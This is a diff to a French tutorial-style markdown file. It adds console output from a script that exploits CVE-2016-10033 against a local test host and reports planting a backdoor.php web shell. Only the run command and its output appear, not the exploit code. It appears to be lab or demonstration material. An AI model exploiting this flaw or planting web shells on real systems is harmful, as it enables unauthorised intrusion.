@@ -47,6 +47,16 @@ C'est intéressant, mais pour tester quelque chose de plus concrète, lancant le
 $ bash second_use_case.sh localhost:8080
 ```
 output 
+```
+[+] exemple d éxploitation CVE-2016-10033
+[+] Lancement de l éxploitation localhost:8080
+[+] Target exploited, acessing shell at http://localhost:8080/backdoor.php
+[+] Vérification si le fichier backdoor a été creé sur le host ciblé
+[+] Backdoor.php trouvé dans le host ciblé
+[+] Términé avec succès ...
+```
+
+résultat
 
 ![](ssi.png)
 
